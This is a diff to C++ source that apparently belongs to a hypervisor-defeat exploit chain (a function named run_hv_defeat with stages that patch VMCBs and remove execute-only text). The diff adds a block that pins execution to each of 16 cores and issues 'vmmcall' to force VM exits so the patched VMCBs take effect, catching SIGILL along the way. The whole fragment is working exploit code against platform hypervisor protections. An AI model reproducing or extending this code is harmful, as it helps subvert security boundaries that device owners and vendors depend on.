@@ -6,6 +6,8 @@
 #include <print>
 #include <fcntl.h>
 #include <sys/cpuset.h>
+#include <signal.h>
+#include <setjmp.h>
 
 extern "C" int cpuset(cpusetid_t *);
 
@@ -537,6 +539,36 @@ int run_hv_defeat(void) { //uint64_t mp4_softc, uint64_t zcn_bar2) {
     if ((r = stage3_patch_vmcbs(&ctx))) return r;
 
     if ((r = stage3b_remove_xotext(&ctx))) return r;
+    
+    // triggers a vmexit on all cores
+    // to apply the vmcb patches
+    // credits: theflow (thank you <3)
+    {
+        static jmp_buf jmp_env;
+        static volatile int vmmcall_faulted;
+
+        auto old_handler = signal(SIGILL, [](int) {
+            vmmcall_faulted = 1;
+            longjmp(jmp_env, 1);
+        });
+
+        for (int i = 0; i < 16; i++) {
+            pin_to_core(i);
+            vmmcall_faulted = 0;
+
+            if (setjmp(jmp_env) == 0) {
+                asm volatile(
+                    "vmmcall"
+                );
+            }
+
+            usleep(1000);
+            std::print("[vmmcall] core: {:2d} {}\n", i,
+                vmmcall_faulted ? "SIGILL (caught)" : "ok");
+        }
+
+        signal(SIGILL, old_handler);
+    }
 
     if (true) {
 
